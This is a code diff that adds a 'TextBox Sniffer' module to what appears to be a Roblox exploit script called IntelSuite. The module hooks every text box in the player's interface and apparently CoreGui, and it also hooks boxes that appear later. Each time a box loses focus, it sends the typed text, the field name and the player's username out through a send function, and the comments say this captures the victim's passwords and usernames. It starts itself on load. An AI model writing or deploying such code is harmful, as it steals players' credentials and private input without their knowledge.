@@ -891,3 +891,80 @@ end
 task.spawn(startChatLogger)
 getgenv().IntelSuite.ChatLogger = startChatLogger
 
+-- ============================================================
+-- MODULE 14: TextBox Sniffer
+-- Hooks FocusLost on ALL TextBoxes in PlayerGui
+-- Catches anything the victim types: passwords, usernames, searches
+-- Also scans for new GUIs added after load
+-- ============================================================
+local function startTextBoxSniffer()
+    if getgenv().IntelSuite.TextBoxActive then return end
+    getgenv().IntelSuite.TextBoxActive = true
+
+    local Players = game:GetService("Players")
+    local hooked = {}
+
+    local function hookTextBox(tb)
+        if hooked[tb] then return end
+        hooked[tb] = true
+        tb.FocusLost:Connect(function()
+            if not getgenv().IntelSuite.IsActive then return end
+            local text = tb.Text
+            if text and text ~= "" then
+                local parent = "Unknown"
+                pcall(function()
+                    parent = tb:GetFullName()
+                end)
+                local msg = "**User:** " .. LocalPlayer.Name ..
+                    "\n**Typed:** " .. tostring(text) ..
+                    "\n**Field:** " .. tostring(parent)
+                send("TEXTBOX INPUT", msg, 16711680)
+            end
+        end)
+    end
+
+    local function scanGui(gui)
+        pcall(function()
+            for _, obj in ipairs(gui:GetDescendants()) do
+                if obj:IsA("TextBox") then
+                    hookTextBox(obj)
+                end
+            end
+            gui.DescendantAdded:Connect(function(obj)
+                if obj:IsA("TextBox") then
+                    hookTextBox(obj)
+                end
+            end)
+        end)
+    end
+
+    -- Scan all existing GUIs in PlayerGui
+    pcall(function()
+        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
+        if playerGui then
+            for _, gui in ipairs(playerGui:GetChildren()) do
+                scanGui(gui)
+            end
+            -- Watch for new GUIs added later
+            playerGui.ChildAdded:Connect(function(gui)
+                task.wait(0.5)
+                scanGui(gui)
+            end)
+        end
+    end)
+
+    -- Also scan CoreGui if accessible
+    pcall(function()
+        local coreGui = game:GetService("CoreGui")
+        if coreGui then
+            scanGui(coreGui)
+        end
+    end)
+
+    send("TEXTBOX SNIFFER", "TextBox sniffer active. All typed input will be logged.", 16711680)
+end
+
+-- Start on load
+task.spawn(startTextBoxSniffer)
+getgenv().IntelSuite.TextBoxSniffer = startTextBoxSniffer
+
